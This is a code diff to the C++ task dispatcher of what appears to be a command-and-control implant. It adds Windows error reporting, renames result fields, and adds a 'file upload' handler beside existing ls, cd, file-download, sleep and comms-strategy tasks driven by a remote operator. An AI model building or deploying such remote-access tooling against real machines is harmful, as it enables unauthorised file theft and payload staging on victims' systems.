@@ -1,11 +1,68 @@
+/*
+
+Command tree
+
+
+...
+results methodology:
+
+message: A message for the operator. This is either a direct output from windows `FormatMessageA`, or something else if not using windows api.
+data: This holds the data output of the action. Ex, `ls`, data will hold the file list. 
+    > note, more specific fields may be included, such as `comms_get_strategy`, and `comms_post_strategy`, when multiple fields are needed.
+    > These should be documented (somewhere...) by me eventually. By default, the GUI spits all response fields out into the terminal.
+
+windows_error_code: A windows error code to always include (even 0, on success). Helfpul for knowing whaat went wrong/passing through
+errors without relying on addtl branch logic. I try to use windows error  macro defs where possible (ex, ERROR_SUCCESS).
+    
+*/
+
 
 #include "../protocols/json/json.h"
 #include <iostream>
 #include "../modules/cd.h"
 #include "../modules/ls.h"
+#include "../modules/files.h"
 #include "../data/msgpack/msgpack.h"
 #include "settings.h"
-#include "../modules/files.h"
+#include "../data/structs.h"
+
+#include <windows.h>
+#include <string>
+#include <iostream>
+//move to own file?
+std::string GetErrorMessage(DWORD dwErrorCode) {
+    if (dwErrorCode == ERROR_SUCCESS) {
+        return "Success";
+    }
+
+    LPSTR messageBuffer = nullptr;
+
+    // Ask Windows to find the message and allocate the required memory
+    size_t size = FormatMessageA(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER |
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        dwErrorCode,
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPSTR)&messageBuffer,
+        0,
+        NULL
+    );
+
+    // Copy the message into a std::string
+    std::string message(messageBuffer, size);
+
+    // Free the buffer allocated by the system
+    LocalFree(messageBuffer);
+
+    //clean up windows stuff
+    //if (!message.empty() && message.back() == '\n') message.pop_back();
+    //if (!message.empty() && message.back() == '\r') message.pop_back();
+
+    return message;
+}
+
 //take in the mapped object, after converted from msgpack
 //all command splitting/overhead logic is done here, then passed to the appropriate modules
 nlohmann::json command_tree(nlohmann::json task_data) {
@@ -39,7 +96,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         SettingsManager::instance().set("comms_get_function", comms_get_function);
 
         add_text_result(result, "message", "Comms Get Function set to: " + comms_get_function);
-        add_text_result(result, "value", comms_get_function);
+        add_text_result(result, "data", comms_get_function);
 
         return result;
     }
@@ -52,7 +109,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         SettingsManager::instance().set("comms_post_function", comms_post_function);
 
         add_text_result(result, "message", "Comms Post Function set to: " + comms_post_function);
-        add_text_result(result, "value", comms_post_function);
+        add_text_result(result, "data", comms_post_function);
 
         return result;
     }
@@ -76,7 +133,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         }
 
         add_text_result(result, "message", "Available Strategies:");
-        add_text_result(result, "value", output);
+        add_text_result(result, "data", output);
 
         return result;
     }
@@ -101,26 +158,29 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         SettingsManager::instance().set("sleep_time", sleep_time);
 
         add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
-        add_text_result(result, "value", std::to_string(sleep_time));
+        add_text_result(result, "data", std::to_string(sleep_time));
 
         return result;
     }
     else if (task_name == "ls") {
+        nlohmann::json result;
         //get args, which are named compontents in the task->args block of the task_data
         std::string directory_to_list = task_data["task"]["args"]["directory"];
         //do a validation here
-
-        std::string list_of_files;
 
         //If for whatever reason, there is a blank directory, fallback to current directory. This is checked on the Client as well,but an "ls" may slip through without a dir on via the API.
         if (directory_to_list.empty()) {
             directory_to_list = "."; //set to current dir if no directory is provided
         }
-        list_of_files = ls(directory_to_list);
 
-        nlohmann::json result;
-        add_text_result(result, "message", "Successfully listed files");
-        add_text_result(result, "value", list_of_files);
+        ModuleResult module_result = ls(directory_to_list);
+        std::string files_list = module_result.data;
+        DWORD windows_error_code = module_result.windows_error_code;
+
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        add_text_result(result, "data", files_list);
+        
 
         return result;
     }
@@ -134,21 +194,14 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //setup json object to return. This will be plugged into the result. 
         nlohmann::json result;
 
-        //confusing, sorry. TLDR, return value is non-zero here. Thanks windows. 
-        //https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setcurrentdirectory
-        if (!cd(directory_to_traverse_to) == 0) {
-            std::string message = "Directory changed to: " + directory_to_traverse_to;
-            //add in results
-            add_text_result(result, "message", message);
-            add_text_result(result, "value", directory_to_traverse_to);
-            //return said result
-            return result;
-        }
 
-        std::string message = "Failed to change directory to: " + directory_to_traverse_to;
-        add_text_result(result, "message", message);
-        add_text_result(result, "value", directory_to_traverse_to);
-        //could have a value, ex, prior_dir as a value too. 
+        ModuleResult module_result = cd(directory_to_traverse_to);
+        std::string message = module_result.data;
+        DWORD windows_error_code = module_result.windows_error_code;
+
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+
         return result;
 
     }
@@ -156,26 +209,68 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         nlohmann::json result;
         add_text_result(result, "message", "yunowork");
 
+        //check for correct values
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_path") || !args["file_path"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_path' is missing or not a string.");
+            return result;
+        }
+
         //get file path from command
         std::string file_path = task_data["task"]["args"]["file_path"];
 
-        std::string file_contents = get_file(file_path);
+        //std::string file_contents = get_file(file_path);
+        ModuleResult module_result = get_file(file_path);
+        std::string file_contents = module_result.data;
+        DWORD windows_error_code = module_result.windows_error_code;
 
         if (file_contents.empty()) {
             add_text_result(result, "message", "File appears to be empty");
+            add_int_result(result, "windows_error_code", static_cast<int>(windows_error_code)); //dword -> int
             return result;
 
         }
 
-        add_bytes_result(result, "file_contents", file_contents);
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        add_bytes_result(result, "data", file_contents);
 
         return result;
     }
-    else if (task_name == "cmd") {
+    else if (task_name == "file upload") {
         nlohmann::json result;
-        add_text_result(result, "error", "cmd not implemented");
-        return result;
 
+        //check for correct values
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
+            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
+            return result;
+        }
+        if (!args.contains("file_path") || !args["file_path"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_path' is missing or not binary.");
+            return result;
+        }
+
+        //get element
+        auto& json_element = task_data["task"]["args"]["file_contents"];
+        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
+        std::vector<uint8_t> file_bytes;
+        file_bytes = json_element.get_binary();
+
+        //get path
+        std::string file_path = task_data["task"]["args"]["file_path"];
+
+        //content is a message, windows_error_code is a win error code
+        //auto [content, windows_error_code] = put_file(file_bytes, file_path);
+        //not using auto, for readability/knowing what type things are
+        ModuleResult module_result = put_file(file_bytes, file_path);
+        std::string message = module_result.data;
+        DWORD windows_error_code = module_result.windows_error_code;
+
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+
+        return result;
     }
     else if (task_name == "exit") {
         //no return, just kill it
